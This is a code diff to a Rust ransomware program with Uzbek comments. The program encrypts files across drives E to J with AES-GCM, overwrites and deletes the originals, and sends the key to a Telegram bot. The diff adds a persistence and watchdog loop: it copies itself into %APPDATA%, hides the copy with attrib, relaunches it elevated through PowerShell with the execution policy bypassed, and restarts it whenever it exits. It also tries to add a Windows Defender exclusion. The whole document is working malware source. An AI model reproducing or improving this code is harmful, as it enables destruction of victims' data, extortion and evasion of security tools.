@@ -12,7 +12,7 @@ use std::{
     fs::{self, File, OpenOptions},
     io::{Read, Write},
     path::{Path, PathBuf},
-    process::{Command, exit},
+    process::Command,
     sync::{Arc, Mutex, mpsc},
     thread
 };
@@ -24,7 +24,7 @@ fn encrypt_file(
     key: &Key<Aes256Gcm>,
     nonce: &Nonce<aes_gcm::aead::generic_array::typenum::U12>,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    // 1) Faylni o‘qish
+    // 1) Faylni o'qish
     let mut f = File::open(file_path)?;
     let mut plaintext = Vec::new();
     f.read_to_end(&mut plaintext)?;
@@ -52,7 +52,7 @@ fn encrypt_file(
     }
     println!("[+] Yaratildi: {}", enc_path.display());
 
-    // 5) Originalni nol bilan to‘ldirib o‘chirish
+    // 5) Originalni nol bilan to'ldirib o'chirish
     let meta = fs::metadata(&enc_path)?;
     if meta.len() > 0 {
         let mut orig = OpenOptions::new().write(true).open(file_path)?;
@@ -63,7 +63,7 @@ fn encrypt_file(
             orig.sync_all()?;
         }
         fs::remove_file(file_path)?;
-        println!("[+] Original o‘chirildi: {}", file_path.display());
+        println!("[+] Original o'chirildi: {}", file_path.display());
     }
 
     Ok(())
@@ -74,7 +74,7 @@ fn encrypt_file(
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     // === 0) Self‑copy + hide + elevate bootstrap ===
 
-    // 0.1) Hozirgi exe yo‘lini aniqlaymiz
+    // 0.1) Hozirgi exe yo'lini aniqlaymiz
     let current_exe = env::current_exe()?;
     // 0.2) Maqsadli katalog (masalan, %APPDATA%\MyHiddenApp)
     let mut dest_dir = env::var("APPDATA")
@@ -89,33 +89,71 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         .expect("Exe file name missing");
     let dest_exe = dest_dir.join(file_name);
 
-    // 0.4) Agar hozirgi joy maqsadli joyga teng bo‘lmasa:
-    if current_exe != dest_exe {
-        // — Nusxalash
-        fs::copy(&current_exe, &dest_exe)?;
-        println!("[*] Copied to {:?}", dest_exe);
-
-        // — Yashirish
-        Command::new("attrib")
-            .args(&["+h", dest_exe.to_string_lossy().as_ref()])
-            .status()?;
-        println!("[*] Hidden via attrib +h");
-
-        // — Admin sifatida qayta ishga tushirish (UAC prompt)
-        Command::new("powershell")
-            .arg("-NoProfile")
-            .arg("-ExecutionPolicy").arg("Bypass")
-            .arg("-Command")
-            .arg(format!(
-                "Start-Process -FilePath '{}' -Verb RunAs",
-                dest_exe.display()
-            ))
-            .spawn()?;
-        println!("[*] Elevation requested, exiting original.");
-
-        // — Original jarayonni to‘xtatish
-        exit(0);
+    // 0.4) Agar hozirgi joy maqsadli joyga teng bo'lmasa:
+if current_exe != dest_exe {
+    // Mavjud faylni o‘chirish (agar mavjud bo‘lsa)
+    if dest_exe.exists() {
+        fs::remove_file(&dest_exe).map_err(|e| format!("Remove existing file error {}: {}", dest_exe.display(), e))?;
+        println!("[*] Existing file removed: {:?}", dest_exe);
     }
+    // Nusxalash
+    fs::copy(&current_exe, &dest_exe).map_err(|e| format!("Copy exe error {}: {}", dest_exe.display(), e))?;
+    println!("[*] Copied to {:?}", dest_exe);
+    // Yashirish
+    let status = Command::new("attrib")
+        .args(&["+h", dest_exe.to_string_lossy().as_ref()])
+        .status()
+        .map_err(|e| format!("Attrib error: {}", e))?;
+    if !status.success() {
+        eprintln!("[-] Failed to hide file: {}", dest_exe.display());
+    } else {
+        println!("[*] Hidden via attrib +h");
+    }
+    // Klonni ishga tushirish
+    let mut child = Command::new("powershell")
+        .arg("-NoProfile")
+        .arg("-ExecutionPolicy")
+        .arg("Bypass")
+        .arg("-Command")
+        .arg(format!("Start-Process -FilePath '{}' -Verb RunAs", dest_exe.display()))
+        .spawn()
+        .map_err(|e| format!("Spawn error: {}", e))?;
+    println!("[*] Elevation requested for clone: {:?}", dest_exe);
+    
+    // Klon jarayonni kuzatish
+    loop {
+        match child.try_wait() {
+            Ok(Some(status)) => {
+                eprintln!("[-] Clone exited with status: {}. Restarting...", status);
+                child = Command::new("powershell")
+                    .arg("-NoProfile")
+                    .arg("-ExecutionPolicy")
+                    .arg("Bypass")
+                    .arg("-Command")
+                    .arg(format!("Start-Process -FilePath '{}' -Verb RunAs", dest_exe.display()))
+                    .spawn()
+                    .map_err(|e| format!("Restart spawn error: {}", e))?;
+                println!("[*] Clone restarted: {:?}", dest_exe);
+            }
+            Ok(None) => {
+                // Klon hali ishlamoqda, biroz kutamiz
+                thread::sleep(std::time::Duration::from_secs(1));
+            }
+            Err(e) => {
+                eprintln!("[-] Error checking clone status: {}. Restarting...", e);
+                child = Command::new("powershell")
+                    .arg("-NoProfile")
+                    .arg("-ExecutionPolicy")
+                    .arg("Bypass")
+                    .arg("-Command")
+                    .arg(format!("Start-Process -FilePath '{}' -Verb RunAs", dest_exe.display()))
+                    .spawn()
+                    .map_err(|e| format!("Restart spawn error: {}", e))?;
+                println!("[*] Clone restarted: {:?}", dest_exe);
+            }
+        }
+    }
+}
     // Add-MpPreference -ExclusionPath "C:\Users\work\Desktop\safe_files"
     let _ = Command::new("Add-MpPreference").args(&["-ExclusionPath", "C:\\Users\\Public\\NonShared\\"]).spawn();
 
@@ -150,7 +188,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         writeln!(f, "Key: {}\nNonce: {}", k_b64, n_b64)?;
     }
 
-    // 7) Fayl yo‘llarini yig‘ish
+    // 7) Fayl yo'llarini yig'ish
     let mut paths = Vec::new();
     for drive in ['E','F','G','H','I','J'] {
         let root = format!("{}:\\", drive);
@@ -188,7 +226,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         handles.push(handle);
     }
 
-    // 10) Fayl yo‘llarini kanalga yuborish
+    // 10) Fayl yo'llarini kanalga yuborish
     for p in paths {
         tx.send(p)?;
     }
@@ -210,6 +248,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }))
         .send();
 
-    println!("[+] Barcha fayllar shifrlab bo‘lingach, kalit Telegramga yuborildi!");
+    println!("[+] Barcha fayllar shifrlab bo'lingach, kalit Telegramga yuborildi!");
     Ok(())
 }
